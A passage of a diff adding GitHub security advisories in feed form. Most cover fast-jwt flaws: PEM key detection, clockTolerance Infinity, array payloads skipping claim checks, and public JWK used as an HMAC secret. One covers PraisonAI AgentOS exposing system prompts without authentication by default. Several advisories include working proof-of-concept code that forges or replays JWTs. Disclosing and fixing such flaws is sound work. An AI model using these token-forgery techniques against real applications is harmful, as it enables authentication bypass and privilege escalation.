+<pre><code class="language-js">const pemStart = trimmedKey.indexOf('-----BEGIN')
+if (pemStart !== -1 &amp;&amp; publicKeyPemMatcher.test(trimmedKey.slice(pemStart))) { ... }
+</code></pre>
+<p><strong>Option B (strict, recommended)</strong> — require the key to be exactly a PEM block:</p>
+<pre><code class="language-js">const pemMatch = /-----BEGIN (RSA )?PUBLIC KEY-----[\s\S]+?-----END \1?PUBLIC KEY-----/.exec(trimmedKey)
+if (pemMatch &amp;&amp; pemMatch[0].trim() === trimmedKey.trim()) { /* valid PEM, no surrounding content */ }
+</code></pre>
+<p><strong>Option C (defense-in-depth, regardless of A/B)</strong> — on the HMAC fallback path, reject any key that <em>contains</em> PEM markers:</p>
+<pre><code class="language-js">if (rawKey.includes('-----BEGIN') || rawKey.includes('-----END')) {
+    throw new Error('Key appears to be a PEM-encoded asymmetric key but did not match expected format; refusing HMAC fallback')
+}
+</code></pre>
+<h3 id="test-coverage-gap">Test coverage gap</h3>
+<p><code>test/crypto.spec.js</code> post-CVE-2026-34950 only tests whitespace padding (<code>['\n', ' ', ' \n', '\n ', '\t\t']</code>). Add coverage for:</p>
+<ul>
+<li>Control bytes (U+0000-U+001F, U+007F)</li>
+<li>Zero-width Unicode (U+200B, U+200C, U+200D, U+180E)</li>
+<li>Comment prefixes (<code>#</code>, <code>//</code>, <code>;</code>, <code>--</code>)</li>
+<li>Mixed-content wrappers (PGP blocks, HTTP headers)</li>
+<li>Arbitrary binary prefix bytes</li>
+</ul>
+<h3 id="credit">Credit</h3>
+<p>Reporter: DC INFOSEC / n0l3x — source-code review + end-to-end PoC verification.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-ww5h-9m49-7xx4">https://github.com/nearform/fast-jwt/security/advisories/GHSA-ww5h-9m49-7xx4</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/pull/632">https://github.com/nearform/fast-jwt/pull/632</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/commit/d96bbc6c5336055a6dbfa318fdbab01197264cfa">https://github.com/nearform/fast-jwt/commit/d96bbc6c5336055a6dbfa318fdbab01197264cfa</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/releases/tag/v6.3.0">https://github.com/nearform/fast-jwt/releases/tag/v6.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-ww5h-9m49-7xx4">https://github.com/advisories/GHSA-ww5h-9m49-7xx4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-ww5h-9m49-7xx4</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-10-08T22:02:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt clockTolerance: Infinity silently bypasses both exp and nbf validation (and persists in the verifier cache)]]></title>
+        <id>https://github.com/advisories/GHSA-687g-22h4-j4w4</id>
+        <link href="https://github.com/advisories/GHSA-687g-22h4-j4w4"/>
+        <updated>2026-10-08T22:02:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>createVerifier({ clockTolerance: Infinity })</code> silently bypasses both <code>exp</code> (expiry) AND <code>nbf</code> (not-before) validation. Any expired or not-yet-active token is accepted as valid. The same primitive also corrupts the verifier's internal cache so cached entries inherit infinite validity — they remain valid past a later developer-removed Infinity config until LRU eviction.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><code>src/verifier.js:531-533</code> — option validation only rejects negative values, not Infinity:</p>
+<pre><code class="language-js">if (clockTolerance &amp;&amp; (typeof clockTolerance !== 'number' || clockTolerance &lt; 0)) {
+  throw new TokenError(TokenError.codes.invalidOption, 'The clockTolerance option must be a positive number.')
+}
+</code></pre>
+<p><code>Infinity</code> passes (it's a number, not less than 0, truthy).</p>
+<p><code>src/verifier.js:583-602</code> — clockTolerance flows into the date-claim validators:</p>
+<pre><code class="language-js">if (!ignoreNotBefore) {
+  validators.push({ ..., modifier: -clockTolerance })   // → -Infinity
+}
+if (!ignoreExpiration) {
+  validators.push({ ..., modifier: +clockTolerance })   // → Infinity
+}
+</code></pre>
+<p><code>src/verifier.js:198-205</code> — applies modifier additively, producing always-pass comparisons:</p>
+<pre><code class="language-js">function validateClaimDateValue(value, modifier, now, greater, errorCode, errorVerb) {
+  const adjusted = value * 1000 + (modifier || 0)   // → ±Infinity
+  const valid = greater ? now &gt;= adjusted : now &lt;= adjusted   // → always true
+  ...
+}
+</code></pre>
+<h2 id="empirical-poc">Empirical PoC</h2>
+<pre><code class="language-js">const { createSigner, createVerifier } = require('fast-jwt')
+const secret = 'test-secret-with-enough-length-to-pass'
+
+const sign = createSigner({ key: secret, algorithm: 'HS256' })
+const expiredToken = sign({
+  sub: 'alice',
+  iat: Math.floor(Date.now()/1000) - 3600,
+  exp: Math.floor(Date.now()/1000) - 1800,  // expired 30 min ago
+})
+
+const v1 = createVerifier({ key: secret })
+try { v1(expiredToken) } catch (e) { console.log('baseline rejects:', e.message) }
+// → "The token has expired at ..."
+
+const v2 = createVerifier({ key: secret, clockTolerance: Infinity })
+console.log('bypass:', v2(expiredToken))
+// → { sub: 'alice', iat: ..., exp: ... }  ← expired token accepted as valid
+
+// Not-yet-active token (nbf in 1 day) — same bypass
+const futureToken = sign({
+  sub: 'bob',
+  iat: Math.floor(Date.now()/1000),
+  nbf: Math.floor(Date.now()/1000) + 86400,
+})
+console.log('bypass nbf:', v2(futureToken))
+// → { sub: 'bob', ... }  ← not-yet-active token accepted as valid
+</code></pre>
+<p>Verified against <code>fast-jwt@HEAD</code> on 2026-06-03 (commit pulled today).</p>
+<h2 id="cache-side-effect">Cache side-effect</h2>
+<p>The verifier's LRU cache uses <code>clockTolerance</code> to compute the cache entry's expiry window:</p>
+<p><code>src/verifier.js:121-134</code>:</p>
+<pre><code class="language-js">cacheValue[1] = ... payload.nbf * 1000 - clockTolerance : 0                   // → -Infinity
+cacheValue[2] = payload.exp * 1000 + clockTolerance                            // → Infinity
+const maxTTL = clockTimestamp + clockTolerance + cacheTTL                      // → Infinity
+</code></pre>
+<p>With <code>clockTolerance: Infinity</code>, cache entries are stored with <code>[min=-Infinity, max=Infinity]</code>. The cache-hit check (<code>min === 0 || now &lt; min || now &lt;= max</code>) always passes for cached tokens.</p>
+<p><strong>Consequence</strong>: a developer who briefly sets <code>clockTolerance: Infinity</code> (e.g., during debug) and then removes it will find that any verifications performed during the debug window remain cached as valid until LRU eviction (default 1000 entries).</p>
+<h2 id="asymmetric-hardening--the-smoking-gun-shape">Asymmetric hardening — the smoking-gun shape</h2>
+<p><code>src/signer.js:98, 104</code> CORRECTLY uses <code>Number.isFinite()</code> to reject Infinity for <code>expiresIn</code> and <code>notBefore</code>:</p>
+<pre><code class="language-js">expiresIn != null &amp;&amp; Number.isFinite(expiresIn)
+  ? Math.floor((iat + expiresIn) / 1000)
+  : ...
+</code></pre>
+<p>The verifier's <code>clockTolerance</code> validation doesn't apply the same guard. The same <code>&lt; 0</code> check pattern is also applied to <code>clockTimestamp</code> (line 527-529) and <code>cacheTTL</code> (line 535-537) — both also accept <code>Infinity</code>.</p>
+<p>This is the kind of asymmetry that often indicates a missed hardening pass: the sign-side was hardened against Infinity but the verify-side wasn't.</p>
+<h2 id="threat-model">Threat model</h2>
+<p>The bug requires the developer to (mis)configure <code>clockTolerance: Infinity</code>. Realistic ways this happens:</p>
+<ol>
+<li><strong>Developer using Infinity as a sentinel</strong> for "disable expiry": common JS idiom; many libraries accept Infinity as "no limit." fast-jwt's signer treats Infinity as invalid (Number.isFinite false) but the verifier silently accepts it.</li>
+<li><strong>JSON / env-var misconfig</strong>: config file or env var sets <code>clockTolerance</code> to <code>"Infinity"</code> (string); <code>Number("Infinity") === Infinity</code>. Surprising via JSON.parse + Number cast or even <code>JSON.parse('{"clockTolerance": null}')</code> if the codec accepts null → Infinity.</li>
+<li><strong>Test config bleed</strong>: integration tests use Infinity to make tokens never expire during long-running tests; the config bleeds into production.</li>
+</ol>
+<p>For a JWT library, silently disabling token expiry on a "looks like a non-negative number" input is a security boundary failure.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Single-line addition: use <code>Number.isFinite()</code> consistent with signer.js:</p>
+<pre><code class="language-js">if (clockTolerance &amp;&amp; (typeof clockTolerance !== 'number' || !Number.isFinite(clockTolerance) || clockTolerance &lt; 0)) {
+  throw new TokenError(TokenError.codes.invalidOption, 'The clockTolerance option must be a finite, non-negative number.')
+}
+</code></pre>
+<p>Same fix for <code>clockTimestamp</code> (line 527-529) and <code>cacheTTL</code> (line 535-537) for consistency.</p>
+<p>Optional defense-in-depth: cap <code>clockTolerance</code> to a reasonable upper bound (e.g., 5 minutes = 300000 ms) with a <code>process.emitWarning</code> above that. Most legitimate use cases need &lt;60s tolerance.</p>
+<h2 id="affected-versions">Affected versions</h2>
+<p>All versions since clockTolerance was first introduced in PR #193 (v1.5.1). Current <code>main</code> HEAD on 2026-06-03 is affected.</p>
+<h2 id="reporter">Reporter</h2>
+<p>Andrew Ridings (independent security researcher). Happy to coordinate disclosure timing and follow up with any clarifications. Email: <a href="mailto:ridingsa@gmail.com">ridingsa@gmail.com</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-687g-22h4-j4w4">https://github.com/nearform/fast-jwt/security/advisories/GHSA-687g-22h4-j4w4</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/commit/c0fb5b88b4c88ff2bdd194ca2c713599ad9e38b6">https://github.com/nearform/fast-jwt/commit/c0fb5b88b4c88ff2bdd194ca2c713599ad9e38b6</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/releases/tag/v6.3.0">https://github.com/nearform/fast-jwt/releases/tag/v6.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-687g-22h4-j4w4">https://github.com/advisories/GHSA-687g-22h4-j4w4</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-687g-22h4-j4w4</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-08T22:02:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt : Silent claim-validator bypass when JWT payload is a JSON array]]></title>
+        <id>https://github.com/advisories/GHSA-5hjw-83fp-phq9</id>
+        <link href="https://github.com/advisories/GHSA-5hjw-83fp-phq9"/>
+        <updated>2026-10-08T22:01:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p> <code>fast-jwt</code>'s <code>createVerifier</code> silently skips <strong>all</strong> configured claim validators (<code>exp</code>, <code>nbf</code>, <code>iss</code>, <code>aud</code>, <code>sub</code>, <code>jti</code>, <code>nonce</code>) when a validly-signed JWT carries a JSON array as its payload instead of an object. The verifier reports success while having enforced only the signature. This breaks the library's documented <code>allowedIss</code> / <code>allowedAud</code> / <code>allowedSub</code> / expiry / replay-protection guarantees and violates RFC 7519 §7.2 step 10, which requires the JWT Claims Set to be a JSON object.</p>
+<h3 id="details">Details</h3>
+<p>The decoder validates the <strong>header</strong> is a non-array object but the <strong>payload</strong> check is missing the <code>Array.isArray</code> guard:</p>
+<pre><code class="language-javascript">// src/decoder.js:49 — header check (correct)
+if (!header || typeof header !== 'object' || Array.isArray(header)) {
+  throw new TokenError(TokenError.codes.malformed, 'The token header is not a valid JSON object.')
+}
+
+// src/decoder.js:65 — payload check (vulnerable)
+if (!payload || typeof payload !== 'object') {     // typeof [] === 'object'
+  throw new TokenError(TokenError.codes.invalidPayload, 'The payload must be an object', { payload })
+}
+
+Because typeof [] === 'object' in JavaScript, an array payload passes the decoder.
+
+In the verifier's validator loop, every check is short-circuited by an in-test that is always false for an array (arrays have only
+numeric indices and length):
+
+// src/verifier.js:304-323
+for (const { type, claim, allowed, array, modifier, greater, errorCode, errorVerb } of validators) {
+  const value = payload[claim]
+  ...
+  if (!(claim in payload)) {     // 'exp' in [] === false, 'iss' in [] === false, etc.
+    continue                      // every validator silently skipped
+  }
+  ...
+}
+
+Result: exp, nbf, iss (allowedIss), aud (allowedAud), sub (allowedSub), jti, and nonce checks are all skipped without any error
+returned to the caller. The verifier returns the array as the payload.
+
+requiredClaims, which uses the same in-test but throws instead of continue (verifier.js:295), does block the bypass — but it is
+opt-in and not commonly configured.
+
+GHSA-gm45-q3v2-6cf8 (CVE-2025-30144) previously patched the case where an individual claim value is an array. That fix operates
+inside the validator loop body and is never reached for this variant.
+</code></pre>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-javascript">const { createVerifier } = require('fast-jwt')
+const crypto = require('crypto')
+
+const key = 'shared-secret'
+const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url')
+const payload = Buffer.from(JSON.stringify(['attacker', 'role:admin'])).toString('base64url')
+const sig = crypto.createHmac('sha256', key).update(`${header}.${payload}`).digest('base64url')
+const token = `${header}.${payload}.${sig}`
+
+const verify = createVerifier({
+  key,
+  allowedIss: ['legit-issuer'],
+  allowedAud: ['legit-audience'],
+  allowedSub: ['legit-subject']
+  // exp enforcement is on by default
+})
+
+console.log(verify(token))
+// Output: [ 'attacker', 'role:admin' ]
+// No error thrown. allowedIss/allowedAud/allowedSub/exp all skipped.
+
+// Control: an object payload with the same garbage claims is correctly rejected:
+const bad = Buffer.from(JSON.stringify({ iss: 'attacker', exp: 1 })).toString('base64url')
+const sig2 = crypto.createHmac('sha256', key).update(`${header}.${bad}`).digest('base64url')
+verify(`${header}.${bad}.${sig2}`)
+// Throws: "The token has expired at 1970-01-01T00:00:01.000Z."
+
+Verified against fast-jwt v6.2.4 (current master, commit a510448).
+</code></pre>
+<p>  Suggested patch (src/decoder.js:65):</p>
+<ul>
+<li>if (!payload || typeof payload !== 'object') {</li>
+</ul>
+<ul>
+<li>if (!payload || typeof payload !== 'object' || Array.isArray(payload)) {
+  throw new TokenError(TokenError.codes.invalidPayload, 'The payload must be an object', { payload })
+}</li>
+</ul>
+<p>  This mirrors the existing header guard at line 49.</p>
+<h3 id="impact">Impact</h3>
+<p>Type: Silent authorization-validator bypass. When a validly-signed JWT carries a JSON array as its payload, createVerifier skips every configured claim validator (exp, nbf, iss/allowedIss, aud/allowedAud, sub/allowedSub, jti, nonce) and returns success. Only the signature is actually checked; the verifier gives no error or warning that the configured defenses did not run.</p>
+<p>Who is impacted: Any application using fast-jwt's createVerifier with claim-validation options and where an attacker can produce or
+   influence a validly-signed token. The realistic deployments are:</p>
+<ul>
+<li>Shared-HMAC microservice meshes — any party holding the secret can mint a token accepted by every other verifier with audience, issuer, and expiry enforcement disabled.</li>
+<li>Multi-tenant token issuers and SSO backends — a tenant or upstream caller able to influence payload shape can obtain
+  forever-tokens accepted platform-wide.</li>
+<li>Delegated signing / weak issuer-side input validation — any issuer that serializes attacker-controlled JSON into the payload
+  without enforcing object shape.</li>
+</ul>
+<p>  Consequences: forever-tokens (expiry bypass), cross-service replay (audience bypass), issuer spoofing in federated/OIDC setups,
+  revocation-list bypass via missing jti, OIDC nonce replay, and audit-trail corruption (payload.sub is undefined so authenticated
+  requests appear unattributable in logs).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nearform/fast-jwt/security/advisories/GHSA-5hjw-83fp-phq9">https://github.com/nearform/fast-jwt/security/advisories/GHSA-5hjw-83fp-phq9</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/pull/639">https://github.com/nearform/fast-jwt/pull/639</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/commit/86e83efd8b5244f50859532d99244f0a9a9a4368">https://github.com/nearform/fast-jwt/commit/86e83efd8b5244f50859532d99244f0a9a9a4368</a></li>
+<li><a href="https://github.com/nearform/fast-jwt/releases/tag/v6.3.0">https://github.com/nearform/fast-jwt/releases/tag/v6.3.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-5hjw-83fp-phq9">https://github.com/advisories/GHSA-5hjw-83fp-phq9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5hjw-83fp-phq9</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-08T22:01:58.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[fast-jwt] fast-jwt treats raw public JWK JSON as an HMAC secret, enabling HS256 token forgery]]></title>
+        <id>https://github.com/advisories/GHSA-g3jj-5cmm-3hxx</id>
+        <link href="https://github.com/advisories/GHSA-g3jj-5cmm-3hxx"/>
+        <updated>2026-10-08T22:01:53.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>fast-jwt</code> 6.2.4 silently classifies raw serialized public JWK JSON
+as an HMAC secret.</p>
+<p>If an application supplies public JWK JSON text as the verifier key and
+HS256 is explicitly allowed or automatically inferred, an attacker who
+knows the same public JSON text can use it as an HMAC key and create an
+arbitrary HS256 token that <code>fast-jwt</code> accepts as valid.</p>
+<p>This can result in authentication or authorization bypass through forged
+JWT claims.</p>
+<p>The PoC demonstrates the issue with a serialized RSA public JWK. The same
+non-PEM classification also applies to raw JWKS JSON text, although the
+attached standalone PoC focuses on the smallest JWK case.</p>
+<h3 id="details">Details</h3>
+<p>The verifier accepts a string or Buffer as key material. In
+<code>src/crypto.js</code>, <code>performDetectPublicKeyAlgorithms()</code> attempts to infer
+the permitted algorithm family from the supplied string.</p>
+<p>Strings matching supported PEM public-key formats are classified as
+asymmetric keys. Any other non-empty string is assumed to be an HMAC
+secret:</p>
+<pre><code class="language-js">function performDetectPublicKeyAlgorithms(key) {
+  const trimmedKey = key.trim()
+  const publicKeyPemMatch = trimmedKey.match(publicKeyPemMatcher)
+
+  if (trimmedKey.match(privateKeyPemMatcher)) {
+    throw new TokenError(
+      TokenError.codes.invalidKey,
+      'Private keys are not supported for verifying.'
+    )
+  } else if (
+    publicKeyPemMatch &amp;&amp;
+    publicKeyPemMatch[1] === 'RSA'
+  ) {
+    return rsaAlgorithms
+  } else if (
+    !publicKeyPemMatch &amp;&amp;
+    !trimmedKey.includes(publicKeyX509CertMatcher)
+  ) {
+    // Not a PEM, assume a plain secret
+    return hsAlgorithms
+  }
+
+  // ...
+}
+
+A serialized RSA, EC, or OKP public JWK is valid JSON, but it is not PEM
+and does not contain a certificate header. It therefore reaches:
+
+return hsAlgorithms
+
+The HS256 verification path then uses the complete public JSON string as
+the HMAC key.
+
+Because JWK public-key material is public by design, an attacker can know
+the verifier's cryptographic key material. When that public material is
+reinterpreted as an HMAC secret, the attacker can calculate a valid
+HS256 signature over arbitrary claims.
+
+The vulnerable transition is:
+
+Public asymmetric JWK JSON
+        |
+        v
+Does not match PEM detection
+        |
+        v
+Classified as a plain secret
+        |
+        v
+HS256 permitted or inferred
+        |
+        v
+Attacker signs using public JSON bytes
+        |
+        v
+Forged token accepted
+
+The attached PoC demonstrates both relevant configurations:
+
+An explicit mixed-family allowlist:
+createVerifier({
+  key: rawJwk,
+  algorithms: ['HS256', 'RS256']
+})
+No explicit algorithm allowlist:
+createVerifier({
+  key: rawJwk
+})
+
+In the second configuration, fast-jwt detects the raw non-PEM string as
+symmetric key material and permits the HS algorithm family.
+
+An RS256-only verifier rejects the same forged token, providing a
+negative control:
+
+createVerifier({
+  key: rawJwk,
+  algorithms: ['RS256']
+})
+
+The documentation describes asymmetric verifier keys as PEM-encoded
+public keys. The security issue is not that the raw JWK is successfully
+parsed as an asymmetric key. It is that ambiguous structured public-key
+text is silently reclassified as a symmetric secret rather than being
+rejected, and that this classification permits an attacker-controlled
+HS256 token.
+
+PoC
+
+Requirements:
+
+Node.js 20 or newer
+npm
+The attached submission ZIP
+
+Extract the attachment and run:
+
+cd poc
+npm install
+node poc.js
+
+The PoC performs the following steps:
+
+Generates a fresh RSA key pair locally.
+Exports only the public key as a JWK.
+Adds ordinary public JWK metadata such as kid, use, and alg.
+Serializes the public JWK as JSON.
+Uses the serialized public JWK text as an HS256 HMAC key.
+Creates a token containing attacker-selected administrative claims.
+Supplies the same raw public JSON string to the real
+fast-jwt verifier.
+Confirms acceptance with a mixed HS256/RS256 allowlist.
+Confirms acceptance when algorithm detection is left enabled.
+Confirms rejection with an RS256-only verifier.
+
+Expected output:
+
+mixed algorithms: forged token accepted
+inferred algorithms: forged token accepted
+RS256-only control: forged token rejected
+VULNERABLE: fast-jwt@6.2.4 accepted attacker-signed HS256 claims
+
+The accepted token contains:
+
+{
+  "sub": "attacker",
+  "role": "admin",
+  "admin": true
+}
+
+The PoC operates entirely locally using a newly generated key pair. It
+does not contact any production service, identity provider, or
+third-party application.
+
+Impact
+
+An affected application may accept attacker-generated JWT claims as
+authentic.
+
+Depending on how verified claims are used, an attacker could potentially
+forge:
+
+user or subject identifiers;
+administrator roles;
+authorization scopes;
+permissions;
+tenant or organization identifiers; and
+application-specific authorization flags.
+
+This may result in authentication bypass, horizontal privilege
+escalation, vertical privilege escalation, or unauthorized access to
+protected application data.
+
+Exploitation requires all of the following:
+
+The application passes raw serialized public JWK or JWKS JSON text as
+the verifier key.
+HS256 is explicitly permitted or is inferred from the non-PEM string.
+The attacker knows the exact serialized bytes supplied to the
+verifier.
+
+Public JWK/JWKS material is normally available to relying parties and
+often exposed through public discovery endpoints. However, property
+ordering, whitespace, or other serialization differences may affect an
+attacker's ability to reproduce the exact HMAC key bytes.
+
+These integration and serialization requirements are represented by
+High attack complexity.
+
+Applications that supply a supported PEM public key and restrict
+verification to the expected asymmetric algorithm family are not
+affected by this PoC.
+
+Earlier package versions were not assessed as part of this report.
+
+Suggested remediation
+
+Structured public-key representations should be detected before an
+arbitrary non-PEM string is classified as symmetric key material.
+
+At minimum, JSON strings containing asymmetric JWK or JWKS structures
+should be rejected for HS* verification. Relevant asymmetric kty
+values include:
+
+RSA
+EC
+OKP
+
+Potential approaches include:
+
+Parse JSON-looking verifier strings before HMAC classification.
+Reject asymmetric JWK/JWKS structures for HS256, HS384, and HS512.
+Do not treat all non-PEM strings as symmetric secrets merely because
+PEM detection failed.
+Require explicit algorithm selection when the key format is
+ambiguous.
+Bind the permitted algorithm family to the semantic key type rather
+than the success or failure of PEM detection.
+
+Regression tests should cover:
+
+compact serialized JWK JSON;
+pretty-printed JWK JSON;
+raw JWKS JSON;
+RSA, EC, and OKP public keys;
+mixed symmetric/asymmetric algorithm allowlists;
+default algorithm detection;
+asymmetric-only algorithm controls;
+trailing whitespace and newline variants; and
+property-order and serialization variants.
+[fast-jwt-raw-jwk-hs256-submit.zip](https://github.com/user-attachments/files/30396435/fast-jwt-raw-jwk-hs256-submit.zip)
+### References
+
+- &lt;https://github.com/nearform/fast-jwt/security/advisories/GHSA-g3jj-5cmm-3hxx&gt;
+- &lt;https://github.com/nearform/fast-jwt/pull/636&gt;
+- &lt;https://github.com/nearform/fast-jwt/commit/10f9591349199ed2ab9fa1748ce92cdca697f6cf&gt;
+- &lt;https://github.com/nearform/fast-jwt/releases/tag/v6.3.0&gt;
+- &lt;https://github.com/advisories/GHSA-g3jj-5cmm-3hxx&gt;
+</code></pre>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g3jj-5cmm-3hxx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-08T22:01:53.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[praisonai] PraisonAI: AgentOS defaults to network-exposed no-auth mode, allowing unauthenticated agent invocation and instruction disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-6wjp-v33h-5cvq</id>
+        <link href="https://github.com/advisories/GHSA-6wjp-v33h-5cvq"/>
+        <updated>2026-10-08T22:01:31.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The AgentOS server in the <code>praisonai</code> TypeScript/npm package ships an insecure default: it binds <code>0.0.0.0</code>, sets no API key, and uses CORS <code>*</code> with credentials. The API-key middleware is only registered when an API key is configured, so the documented quickstart (<code>new AgentOS({agents:[...]}).serve({port})</code>) exposes, <strong>unauthenticated</strong>, <code>GET /api/agents</code> (which leaks agent names/roles/instructions, i.e. system prompts) and <code>POST /api/chat</code> (which invokes agents). Any network peer can read agent system prompts and drive the agent. Runtime-confirmed; severity High.</p>
+<h2 id="details">Details</h2>
+<h3 id="affected-component">Affected component</h3>
+<ul>
+<li>Package: <code>praisonai</code> (npm / TypeScript). Files <code>src/praisonai-ts/src/os/config.ts</code> and <code>src/praisonai-ts/src/os/agentos.ts</code> (<code>AgentOS</code>).</li>
+</ul>
+<h3 id="vulnerable-code--root-cause">Vulnerable code / root cause</h3>
+<p>Path:
+<code>src/praisonai-ts/src/os/config.ts</code></p>
+<p>Class/const:
+<code>DEFAULT_AGENTOS_CONFIG</code> / <code>mergeConfig</code></p>
+<p>Snippet:</p>
+<pre><code class="language-ts">export const DEFAULT_AGENTOS_CONFIG = {
+  host: '0.0.0.0',
+  corsOrigins: ['*'],
+  apiKey: '',
+  // ...
+};
+// mergeConfig: apiKey = userConfig?.apiKey ?? process.env.PRAISONAI_AGENTOS_API_KEY ?? '';
+</code></pre>
+<p>Issue: defaults bind all interfaces, with an empty API key and wildcard CORS. <code>apiKey</code> stays empty unless the developer explicitly sets it.</p>
+<p>Path:
+<code>src/praisonai-ts/src/os/agentos.ts</code></p>
+<p>Function:
+<code>serve</code> / <code>_registerRoutes</code> (Express app)</p>
+<p>Snippet:</p>
+<pre><code class="language-ts">if (this.config.apiKey) {              // auth middleware ONLY added when apiKey is set
+  app.use((req,res,next) =&gt; { /* 401 unless Bearer/x-auth-token matches */ });
+}
+// routes:
+app.get(`${apiPrefix}/agents`, ...)    // returns name/role/instructions
+app.post(`${apiPrefix}/chat`,  ...)    // calls agent.chat(message)
+</code></pre>
+<p>Issue: the only auth gate is conditional on a non-empty <code>apiKey</code>. With the default empty key, no auth middleware is registered, and <code>GET /api/agents</code> (system-prompt disclosure) and <code>POST /api/chat</code> (agent invocation) are served to any network client. CORS sets <code>Access-Control-Allow-Credentials: true</code> with a wildcard origin.</p>
+<h3 id="attack-flow">Attack flow</h3>
+<ol>
+<li>Developer deploys AgentOS via the quickstart without setting <code>apiKey</code>/<code>PRAISONAI_AGENTOS_API_KEY</code>.</li>
+<li>Any network peer calls <code>GET /api/agents</code> → receives agent instructions/system prompts.</li>
+<li>Any network peer calls <code>POST /api/chat</code> → invokes the agent.</li>
+</ol>
+<h3 id="why-existing-protection-is-bypassed">Why existing protection is bypassed</h3>
+<p>There is no protection in the default config — the auth gate is skipped when <code>apiKey</code> is empty (the default), and the server binds all interfaces.</p>
+<h3 id="security-boundary">Security boundary</h3>
+<p>Unauthenticated network access to agent metadata + invocation. This is the CVE-2026-44338 anti-pattern recurring in the TS package, and worse (0.0.0.0 is the default).</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<h3 id="environment">Environment</h3>
+<p>Real AgentOS from <code>src/praisonai-ts</code> run via ts-node in a node container with default config (stub agent, no LLM needed). <code>127.0.0.1:18000</code>. Runnable assets: <code>PraisonAI-Runtime-Repro\runtime-files\</code> (<code>docker-compose.agentos.yml</code>).</p>
+<h3 id="steps-to-reproduce">Steps to reproduce</h3>
+<ol>
+<li><code>PRAI-01-01-AgentOS-Agents-NoAuth</code>: <code>GET /api/agents</code> (no Authorization) → <code>127.0.0.1:18000</code>.</li>
+<li><code>PRAI-01-02-AgentOS-Chat-NoAuth</code>: <code>POST /api/chat {"message":"hello from attacker"}</code> (no Authorization).</li>
+</ol>
+<h3 id="expected-result">Expected result</h3>
+<p>Non-loopback exposure should require authentication; agent instructions should not be disclosed unauthenticated.</p>
+<h3 id="actual-result">Actual result</h3>
+<ul>
+<li><code>GET /api/agents</code> → <code>200</code>, leaks <code>"instructions":"SYSTEM PROMPT SECRET ... PRAISONAI_INTERNAL_SECRET_CANARY_7f3a91"</code>; response header <code>Access-Control-Allow-Credentials: true</code>.</li>
+<li><code>POST /api/chat</code> → <code>200</code>, agent invoked (<code>"response":"...PRAISONAI_AGENTOS_CANARY_7f3a91..."</code>).</li>
+</ul>
+<h3 id="screenshots">Screenshots</h3>
+<p><strong>Unauthenticated <code>/api/agents</code> leaks agent instructions</strong></p>
+<p>A GET request to <code>/api/agents</code> succeeds without an <code>Authorization</code> header. The response exposes agent metadata and instructions, including the canary system-prompt value.</p>
+<img width="1535" height="829" alt="01-AgentOS-Agents-NoAuth" src="https://github.com/user-attachments/assets/705087e1-8017-46f6-9a91-edb8312e2f26">
+
+<p><strong>Unauthenticated <code>/api/chat</code> invokes the agent</strong></p>
+<p>A POST request to <code>/api/chat</code> succeeds without an <code>Authorization</code> header. The response confirms that the attacker-controlled message was processed by the configured agent.</p>
+<img width="1537" height="833" alt="02-AgentOS-Chat-NoAuth" src="https://github.com/user-attachments/assets/5cdf8f56-b8d8-498b-87bd-44834f39998c">
+
+<h3 id="reproduction-assets">Reproduction assets</h3>
+<p>The attached archive contains the local Docker runtime used to reproduce the issue with controlled canary values only. It does not contain real secrets, third-party API keys, or production credentials.</p>
+<p><a href="https://github.com/user-attachments/files/29143421/PraisonAI-Runtime-Repro.zip">PraisonAI-Runtime-Repro.zip</a></p>
+<h2 id="impact">Impact</h2>
+<p>Unauthenticated disclosure of agent configuration/system prompts; unauthenticated agent invocation; LLM cost abuse; possible tool abuse depending on the configured agent's tools; permissive CORS-with-credentials.</p>
+<h2 id="suggested-remediation">Suggested remediation</h2>
+<ul>
